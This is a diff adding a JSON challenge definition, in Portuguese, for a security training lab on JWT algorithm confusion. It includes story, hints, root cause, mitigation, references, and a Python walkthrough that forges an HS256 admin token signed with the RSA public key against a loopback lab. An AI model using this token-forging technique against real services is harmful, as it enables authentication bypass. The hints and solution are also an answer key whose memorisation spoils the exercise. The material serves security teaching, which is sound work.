@@ -1,0 +1,34 @@
+{
+  "slug": "auth-jwt-alg-confusion",
+  "title": "O outro algoritmo",
+  "codename": "CIPHERLINE",
+  "summary": "Um serviço de verificação aceita tokens `RS256` mas cai para `HS256`, usando a chave pública RSA como segredo HMAC. A chave pública verifica assinaturas, então também assina quando o verificador toma um atalho.",
+  "category": "auth",
+  "difficulty": "hard",
+  "lab_dir": "auth-jwt-alg-confusion",
+  "estimated_minutes": 30,
+  "xp": 360,
+  "tech": ["Flask", "JWT", "RSA", "HMAC"],
+  "tags": ["jwt", "algorithm-confusion", "key-confusion", "token-forgery"],
+  "story": "A Cipherline emite tokens de identidade e publica sua chave pública RSA para que serviços verifiquem assinaturas. O verificador foi estendido para um provedor legado que só suporta HS256, e os dois algoritmos compartilham o mesmo caminho de código. A chave pública é pública. O console de admin confia na claim de papel entregue pelo gateway.",
+  "objective": "Obtenha um token RS256 de guest e a chave pública, forje um token HS256 com papel `admin` e cuja chave HMAC seja a chave pública, e chame `/admin`.",
+  "rules": "Fique na origem loopback atribuída. O lab gera um par de chaves RSA por processo.",
+  "flags": [
+    {"key": "flag", "label": "Flag do console de admin", "flag_type": "api", "points": 360, "required": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Dois algoritmos, uma chave", "body": "Faça GET em `/login?username=guest` para um token RS256 e GET em `/jwks` para a chave pública. O caminho de código do verificador escolhe o algoritmo a partir do header do token e então decide como usar a chave.", "cost": 25},
+    {"level": 2, "title": "A chave que você conhece assina seu token", "body": "Se o verificador trata a chave pública RSA como segredo HMAC para `HS256`, você pode assinar quaisquer claims com ela. É o clássico ataque de confusão de algoritmo.", "cost": 35},
+    {"level": 3, "title": "Forje o token de admin", "body": "Monte o header `{\"alg\":\"HS256\",\"typ\":\"JWT\"}`, o payload `{\"sub\":\"guest\",\"role\":\"admin\"}` e aplique HMAC-SHA256 ao signing input com o PEM exato da chave pública de `/jwks`. Envie como cookie `jwt_session` para `/admin`; o console confia na claim de papel do gateway.", "cost": 45}
+  ],
+  "solution": {
+    "walkthrough": "```python\nimport base64, hashlib, hmac, json, httpx\nb = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()\nc = httpx.Client(base_url='http://127.0.0.1:PORT')\nc.get('/login', params={'username': 'guest'})\npem = c.get('/jwks').text.strip().encode()\nh = b(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())\np = b(json.dumps({'sub': 'guest', 'role': 'admin'}, separators=(',', ':')).encode())\nsig = b(hmac.new(pem, f'{h}.{p}'.encode(), hashlib.sha256).digest())\nc.cookies.set('jwt_session', f'{h}.{p}.{sig}')\nprint(c.get('/admin').text)\n```\n\nO token forjado é aceito porque o verificador selecionou HS256 a partir do header e então usou os bytes da chave pública RSA como segredo HMAC.",
+    "root_cause": "O verificador confia no header `alg` em vez de um algoritmo esperado, e o mesmo material de chave serve a dois algoritmos com propriedades de confiança diferentes. Chaves públicas RSA são públicas; uma vez que o verificador usa uma como segredo HMAC, qualquer atacante pode assinar tokens.",
+    "mitigation": "Configure uma allowlist explícita dos algoritmos esperados por tipo de token e rejeite divergências. Use key sets separados por algoritmo, verifique RS256 com a chave pública e HS256 apenas com um segredo de alta entropia. Prefira bibliotecas JWT maduras com verificação de algoritmo fixo."
+  },
+  "references": [
+    {"title": "PortSwigger — JWT attacks", "url": "https://portswigger.net/web-security/jwt", "source_type": "official", "description": "Confusão de algoritmo e outras falhas de verificação de JWT."},
+    {"title": "OWASP — JSON Web Token for Java Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html", "source_type": "standard", "description": "Fixação de algoritmo e tratamento de segredos."},
+    {"title": "RFC 7519 — JSON Web Token", "url": "https://www.rfc-editor.org/rfc/rfc7519", "source_type": "standard", "description": "Estrutura e claims do JWT."}
+  ]
+}
